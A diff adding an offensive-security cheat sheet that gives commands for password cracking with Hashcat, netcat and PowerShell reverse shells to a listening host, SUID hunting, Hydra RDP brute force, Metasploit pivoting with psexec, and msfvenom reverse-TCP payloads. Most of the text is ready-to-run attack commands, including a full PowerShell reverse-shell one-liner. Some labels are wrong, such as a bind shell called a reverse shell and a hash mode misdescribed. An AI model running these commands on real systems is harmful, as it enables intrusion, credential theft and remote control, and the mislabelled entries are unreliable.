@@ -1,0 +1,380 @@
+Section 1: Hashcat Password Cracking
+
+Hashcat is a powerful password cracking tool used to recover passwords from hash values. In this section, we will explore how to use Hashcat to crack passwords.
+
+The command to run Hashcat for Windows hash dumping is as follows:
+```
+hashcat -m 400 -a 0 hash /usr/share/wordlists/rockyou.txt
+```
+This command uses the rockyou.txt wordlist to crack the passwords from the provided hash.
+
+Section 2: Netcat Examples
+
+Netcat, also known as "nc," is a versatile networking utility that can be used for various purposes, including port scanning, banner grabbing, and creating reverse shells. Let's explore a few Netcat examples:
+
+Example 1: Basic Netcat Listener
+```
+nc -l -p 31337
+```
+This command sets up a basic Netcat listener on port 31337, waiting for incoming connections.
+
+Example 2: Reverse Shell with Netcat
+```
+nc -Lp 31337 -vv -e cmd.exe
+```
+This command sets up a Netcat listener on port 31337 and executes a command shell (cmd.exe) upon connection.
+
+Section 3: Banner Grabbing with Netcat
+
+Banner grabbing is the process of retrieving information about a target system by examining its network banners. Netcat can be used for banner grabbing by sending specific requests to a target host. Here's an example:
+
+```
+nc 192.168.0.10 80
+GET / HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/4.0
+Referrer: www.example.com
+<enter>
+<enter>
+```
+This command establishes a connection to the target IP on port 80 and sends an HTTP request to retrieve the homepage. Adjust the request according to the target's protocol and specific information you want to gather.
+
+Section 4: Windows Reverse Shell
+
+A reverse shell allows an attacker to gain command execution on a remote system by establishing a connection from the target system back to the attacker's machine. Here are two examples of setting up a Windows reverse shell:
+
+Example 1: Using Netcat
+```
+nc example.com 80 -e cmd.exe
+```
+This command connects to "example.com" on port 80 and executes a command shell (cmd.exe) on the target system.
+
+Example 2: Using PowerShell
+```
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.10', 31337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+This PowerShell command establishes a TCP connection to the specified IP and port and opens a command shell on the target machine.
+
+Section 5: Finding SUID/SGID Root Files
+
+SUID (Set User ID) and SGID (Set Group ID) are permissions that can be set on files to allow them to be executed with the privileges of the file owner or group, respectively. Finding such files can be valuable for privilege escalation. Here are commands to find SUID and SGID root files:
+
+Find SUID root files:
+```
+find / -user root -perm -4000 -print
+```
+This command searches for files owned by the root user with the SUID permission set and prints their paths.
+
+Find SGID root files:
+```
+find / -group root -perm -2000 -print
+```
+This command searches for files owned by the root group with the SGID permission set and prints their paths.
+
+Find SUID and SGID files owned by anyone:
+```
+find / -perm -4000 -o -perm -2000 -print
+```
+This command searches for files with either SUID or SGID permissions set, regardless of the owner or group, and prints their paths.
+
+Find files that are not owned by any user:
+```
+find / -nouser -print
+```
+This command searches for files that do not have an associated user and prints their paths.
+
+Find files that are not owned by any group:
+```
+find / -nogroup -print
+```
+This command searches for files that do not have an associated group and prints their paths.
+
+Find symlinks and what they point to:
+```
+find / -type l -ls
+```
+This command searches for symbolic links and prints their information along with the target they point to.
+
+Section 6: Python Shell
+
+Python provides an interactive shell that allows you to execute Python code and interact with the system. Here's an example of spawning a Python shell:
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+This command spawns an interactive shell using Python's `pty` module and executes the `/bin/bash` shell.
+
+Section 7: Python/Ruby/PHP HTTP Server
+
+Python, Ruby, and PHP can be used to create simple HTTP servers for hosting files or serving web content locally. Here are commands to start HTTP servers using these languages:
+
+Python 2 HTTP server:
+```
+python2 -m SimpleHTTPServer
+```
+This command starts an HTTP server on port 8000 using Python 2. You can access files in the current directory using a web browser or `curl`.
+
+Python 3 HTTP server:
+```
+python3 -m http.server
+```
+This command starts an HTTP server on port 8000 using Python 3.
+
+Ruby HTTP server:
+```
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start"
+```
+This command starts an HTTP server on port 8888 using Ruby. It serves files from the current directory.
+
+PHP HTTP server:
+```
+php -S 0.0.0.0:8888
+```
+This command starts an HTTP server on port 8888 using PHP. It serves files from the current directory.
+
+Section 8: Getting PIDs of Processes
+
+In some situations, you may need to identify the process IDs (PIDs) of running processes. Here are commands to retrieve the PIDs of processes:
+
+Get PIDs of processes using a specific port (e.g., port 80):
+```
+fuser -nv tcp 80
+```
+This command displays the PIDs of processes using the specified TCP port (in this case, port 80).
+
+Kill processes using a specific port (e.g., port 80):
+```
+fuser -k -n tcp 80
+```
+This command terminates the processes using the specified TCP port (in this case, port 80).
+
+Section 9: Hydra RDP Bruteforce
+
+Hydra is a powerful tool for performing brute-force attacks on various protocols. Here's an example of using Hydra to perform an RDP (Remote Desktop Protocol) brute-force attack:
+
+```
+hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
+```
+This command attempts to brute-force the RDP server with the IP address X.X.X.X using the username "admin" and a list of passwords located at `/root/Desktop/passwords`. Adjust the username, password file path, and target IP address according to your specific scenario.
+
+Section 10: Mount Remote Windows Share
+
+To mount a remote Windows share on a Linux system, you can use the `smbmount` command. Here's an example:
+
+```
+smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
+```
+This command mounts the `C$` share on the remote Windows system with the IP address X.X.X.X to the `/mnt/remote/` directory on your Linux system. Replace `X.X.X.X` with the actual IP address, and adjust the username and password according to your authentication requirements.
+
+Section 11: Compiling Exploit in Kali
+
+When working with exploits, you may need to compile them before executing. Here are commands to compile exploits in Kali Linux:
+
+Compile a 32-bit exploit:
+```
+gcc -m32 -o output32 hello.c
+```
+This command compiles the `hello.c` exploit code into a 32-bit executable named `output32`.
+
+Compile a 64-bit exploit:
+```
+gcc -m64 -o output hello.c
+```
+This command compiles the `hello.c` exploit code into a 64-bit executable named `output`.
+
+Section 12: Compiling Windows Exploits on Kali
+
+If you're using Kali Linux and want to compile Windows exploits, you can utilize the MinGW toolchain. Here's an example:
+
+```
+wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
+wine mingw-get-setup.exe
+```
+These commands download and install the MinGW toolchain.
+
+After installation, you can compile Windows exploits using the MinGW `gcc` compiler. Here's an example:
+
+```
+cd /root/.wine/drive_c/windows
+wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
+cd /root/.wine/drive_c/MinGW/bin
+wine gcc -o ability.exe /tmp/exploit.c -lwsock32
+wine ability.exe
+```
+These commands navigate to the MinGW bin directory, download the necessary files, and compile the `exploit.c` file into an executable named `ability.exe`. Finally, the executable is executed using Wine.
+
+Section 13: NASM Commands
+
+NASM (Netwide Assembler) is a popular assembler used in assembly language programming. Here are some common NASM commands:
+
+Assemble assembly code into a binary file:
+```
+nasm -f bin -o payload.bin payload.asm
+```
+This command assembles the `payload.asm` assembly code into a binary file named `payload.bin`.
+
+Assemble assembly code into an ELF (Executable and Linkable Format) object file:
+```
+nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
+```
+These commands assemble the `payload.asm` assembly code into an ELF object file named `payload.o`, link it using `ld` into an executable named `payload`, and then display the disassembly using `objdump`.
+
+Section 14: SSH Pivoting
+
+SSH pivoting allows you to establish a tunnel through an intermediate SSH server to reach a target system that is not directly accessible. Here's how you can use SSH pivoting:
+
+1. SSH Dynamic Port Forwarding:
+```
+ssh -D 127.0.0.1:1080 -p 22 user@IP
+```
+This command establishes a dynamic port forwarding tunnel, creating a SOCKS proxy on your local machine at `127.0.0.1:1080`. Replace `user` with your SSH username and `IP` with the IP address or hostname of the SSH server.
+
+2. Configure ProxyChains:
+Edit the `/etc/proxychains.conf` file and add the following line at the end:
+```
+socks4 127.0.0.1 1080
+```
+This configures ProxyChains to use the SOCKS proxy on `127.0.0.1:1080`.
+
+3. Using ProxyChains:
+You can now use ProxyChains to route your network traffic through the SSH tunnel. For example, to execute a command `target` through the SSH tunnel:
+```
+proxychains target
+```
+
+Section 15: SSH Pivoting from One Network to Another
+
+If you need to perform SSH pivoting from one network to another, here's how you can achieve it:
+
+1. Set up the first SSH tunnel:
+```
+ssh -D 127.0.0.1:1080 -p 22 user1@IP1
+```
+This command establishes a dynamic port forwarding tunnel to the first SSH server.
+
+2. Configure ProxyChains for the first SSH tunnel:
+Edit the `/etc/proxychains.conf` file and add the following line at the end:
+```
+socks4 127.0.0.1 1080
+```
+
+3. Set up the second SSH tunnel:
+```
+proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
+```
+This command establishes a dynamic port forwarding tunnel from the first SSH tunnel to the second SSH server.
+
+4. Configure ProxyChains for the second SSH tunnel:
+Edit the `/etc/proxychains.conf` file and add the following line at the end:
+```
+socks4 127.0.0.1 1081
+```
+
+5. Using ProxyChains to access the target system:
+You can now route your network traffic through both SSH tunnels. For example, to execute a command `target` through the SSH tunnels:
+```
+proxychains target
+```
+
+Section 16: Pivoting Using Metasploit
+
+Metasploit Framework provides modules for pivoting through compromised hosts. Here's an example of using Metasploit for pivoting:
+
+1. Obtain a Meterpreter session on the compromised host:
+```
+# Start by establishing a Meterpreter session on the compromised host using any applicable exploit.
+```
+
+2. Configure routing in Meterpreter:
+```
+meterpreter > ipconfig
+```
+Note the IP address of the compromised host (e.g., `10.1.13.3`).
+
+```
+meterpreter > run autoroute -s 10.1.13.0/24
+```
+This command adds a route to the target network through the compromised host.
+
+```
+meterpreter > run autoroute -p
+```
+This command displays the configured routes.
+
+3. Background the Meterpreter session:
+```
+meterpreter > Ctrl+Z
+```
+
+4. Exploit the target system:
+```
+msf auxiliary(tcp) > use exploit/windows/smb/psexec
+msf exploit(psexec) > set RHOST 10.1.13.2
+msf exploit(psexec) > exploit
+```
+This exploits the target system through the compromised host and establishes a Meterpreter session on the target.
+
+5. Obtain the IP address of the target system:
+```
+meterpreter > ipconfig
+```
+Note the IP address of the target system (e.g., `10.1.13.2`).
+
+You can now use the established Meterpreter session on the target system for further exploitation.
+
+Section 17: Exploit-DB Search Using CSV File
+
+Exploit-DB is a popular online database of exploits. You can use it to search for specific exploits based on various criteria. Here's an example of searching Exploit-DB using a CSV file:
+
+1. Clone the Exploit-DB repository:
+```
+git clone https://github.com/offensive-security/exploit-database.git
+cd exploit-database
+```
+
+2. Update the Exploit-DB:
+```
+./searchsploit –u
+```
+
+3. Perform a search:
+```
+./searchsploit apache 2.2
+```
+This command searches for exploits related to Apache 2.2.
+
+```
+./searchsploit "Linux Kernel"
+```
+This command searches for exploits related to the Linux Kernel.
+
+You can customize the search by combining multiple search terms, filtering by specific criteria, and more.
+
+Section 18: MSF Payloads
+
+Metasploit Framework (MSF) provides a variety of payloads that can be used during penetration testing and exploit development. Here are some examples:
+
+Generate a Windows Meterpreter reverse TCP payload:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
+```
+This command generates a Windows executable named `system.exe` with a reverse TCP Meterpreter payload. Replace `<IP Address>` with your IP address.
+
+Generate a PHP Meterpreter reverse TCP payload:
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
+```
+This command generates a PHP file named `exploit.php` with a reverse TCP Meterpreter payload. Replace `<IP Address>` with your IP address.
+
+Generate a Windows Meterpreter reverse TCP payload in ASP format:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
+```
+This command generates an ASP file named `file.asp` with a reverse TCP Meterpreter payload for Windows. Replace `<IP Address>` with your IP address.
+
+Generate a Windows Meterpreter reverse TCP payload in C format:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c
+```
+This command generates C code with a reverse TCP Meterpreter payload for Windows. Replace `<IP Address>` with your IP address.
+
